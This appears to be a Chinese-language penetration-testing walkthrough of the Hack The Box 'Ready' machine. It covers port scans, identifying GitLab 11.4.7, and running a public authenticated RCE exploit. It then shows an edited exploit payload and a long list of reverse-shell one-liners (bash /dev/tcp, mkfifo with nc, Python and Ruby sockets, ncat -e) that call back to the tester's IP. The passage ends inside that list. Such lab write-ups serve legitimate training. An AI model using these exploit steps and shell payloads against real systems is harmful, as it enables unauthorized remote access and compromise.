# 服务探测

开放端口
```
┌──(root㉿rock)-[~]
└─# nmap -p- --open 10.10.10.220              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 04:24 EDT
Nmap scan report for 10.10.10.220
Host is up (0.030s latency).
Not shown: 61766 closed tcp ports (reset), 3767 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Nmap done: 1 IP address (1 host up) scanned in 50.09 seconds
```

详细端口信息
```

┌──(root㉿rock)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.220 -p 22,5080
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 04:26 EDT
Nmap scan report for 10.10.10.220
Host is up (0.092s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
|_http-title: GitLab is not responding (502)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   ... 10
11  12.36 ms 10.10.10.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds

```


# web

robots.txt
```
User-Agent: *
Disallow: /autocomplete/users
Disallow: /search
Disallow: /api
Disallow: /admin
Disallow: /profile
Disallow: /dashboard
Disallow: /projects/new
Disallow: /groups/new
Disallow: /groups/*/edit
Disallow: /users
Disallow: /help
# Only specifically allow the Sign In page to avoid very ugly search results
Allow: /users/sign_in

# Global snippets
User-Agent: *
Disallow: /s/
Disallow: /snippets/new
Disallow: /snippets/*/edit
Disallow: /snippets/*/raw

# Project details
User-Agent: *
Disallow: /*/*.git
Disallow: /*/*/fork/new
Disallow: /*/*/repository/archive*
Disallow: /*/*/activity
Disallow: /*/*/new
Disallow: /*/*/edit
Disallow: /*/*/raw
Disallow: /*/*/blame
Disallow: /*/*/commits/*/*
Disallow: /*/*/commit/*.patch
Disallow: /*/*/commit/*.diff
Disallow: /*/*/compare
Disallow: /*/*/branches/new
Disallow: /*/*/tags/new
Disallow: /*/*/network
Disallow: /*/*/graphs
Disallow: /*/*/milestones/new
Disallow: /*/*/milestones/*/edit
Disallow: /*/*/issues/new
Disallow: /*/*/issues/*/edit
Disallow: /*/*/merge_requests/new
Disallow: /*/*/merge_requests/*.patch
Disallow: /*/*/merge_requests/*.diff
Disallow: /*/*/merge_requests/*/edit
Disallow: /*/*/merge_requests/*/diffs
Disallow: /*/*/project_members/import
Disallow: /*/*/labels/new
Disallow: /*/*/labels/*/edit
Disallow: /*/*/wikis/*/edit
Disallow: /*/*/snippets/new
Disallow: /*/*/snippets/*/edit
Disallow: /*/*/snippets/*/raw
Disallow: /*/*/deploy_keys
Disallow: /*/*/hooks
Disallow: /*/*/services
Disallow: /*/*/protected_branches
Disallow: /*/*/uploads/

```

在这个页面确认gitlab版本为：11.4.7
```
http://10.10.10.220:5080/help
```

搜索漏洞情况，存在一个授权的RCE
```
┌──(root💀kali)-[~/htb/Ready]
└─# searchsploit gitlab 11.4.7
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                                                                                                                                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                                                                                                                                                 | ruby/webapps/49257.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


```


执行payload，但是没有返回rev shell
```
──(root💀kali)-[~/htb/Ready]
└─# python3 49334.py -u chen -p 123456789 -g 'http://10.10.10.220' -l 10.10.16.2 -P 5080
[+] authenticity_token: P6oayybySIHkjN1hOiORE2To2qUsij2zCCWcEwRjr/eJ/UnDoWxn4YF5ZWw9aRBAUenpEHf0nkcnXQAZfSnCew==
[+] Creating project with random name: project2006
[+] Running Exploit
[+] Exploit completed successfully!

```

查看exp源代码，发现用的是nc反弹的shell
```
f'nc {local_ip} {local_port} -e /bin/bash'
```

linux为了安全考虑，一般会禁用nc的-e和-c参数

我们首先要证明确实是存在RCE，然后再想其他办法反弹shell回来

我们把上面那行代码改为：
```
 f'wget http://10.10.16.2/any'
```

在kali本地开一个http服务器，然后执行exp，收到get请求，证明rce存在
```
┌──(root💀kali)-[~/htb/Ready]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.220 - - [01/Jul/2022 05:22:07] code 404, message File not found
10.10.10.220 - - [01/Jul/2022 05:22:07] "GET /any HTTP/1.1" 404 -

```

使用下面payload


bash -i >& /dev/tcp/10.10.16.2/8080 0>&1

0<&196;exec 196<>/dev/tcp/10.10.16.2/8080; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.10.16.2/8080 0<&1 2>&1


sh -i >& /dev/udp/10.10.16.2/5080 0>&1


python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",5080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'


rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 5080 >/tmp/f

rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 5080 >/tmp/f

nc -c bash 10.10.16.2 5080


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",5080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'


python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",5080));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'


python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",5080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'



ruby -rsocket -e'f=TCPSocket.open("10.10.16.2",5080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ncat 10.10.16.2 5080 -e /bin/bash